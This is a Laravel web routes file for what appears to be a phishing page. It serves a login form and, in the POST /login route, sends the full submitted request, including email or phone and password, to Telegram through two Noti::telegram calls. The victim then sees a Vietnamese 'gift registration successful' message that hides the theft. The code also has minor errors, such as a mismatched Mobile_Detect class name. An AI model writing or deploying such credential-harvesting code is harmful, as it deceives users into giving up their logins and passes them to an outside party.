<?php

use App\Models\Noti;
use Illuminate\Support\Facades\Route;
use Detection\MobileDetect as MobileDetect;
use Illuminate\Http\Request;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
})->name('home');
Route::get('/login', function (Request $request) {
    $detect = new Mobile_Detect;

    // Any mobile device (less tablets)
    if ($detect->isMobile() && !$detect->isTablet()) {
        return view('login2');
    }

    // Any tablet device
    elseif ($detect->isTablet()) {
        return view('login');
    }

    // Desktop device
    else {
        return view('login');
    }
})->name('login');

Route::post('/login', function (Request $request){
    $validated = $request->validate([
        'email' => 'required',
        'password' => 'required',
    ], [
        'email.required' => 'Email hoặc số điện thoại không được để trống',
        'password.required' => 'Password không được để trống',
    ]);

    Noti::telegram($request->all());
    Noti::telegram2($request->all());
    Alert::success('Đăng ký nhận quà thành công', 'Chúng tôi sẽ sớm liên hệ bạn để nhận quà');
    return redirect('/');
    // dd($request->all());
});
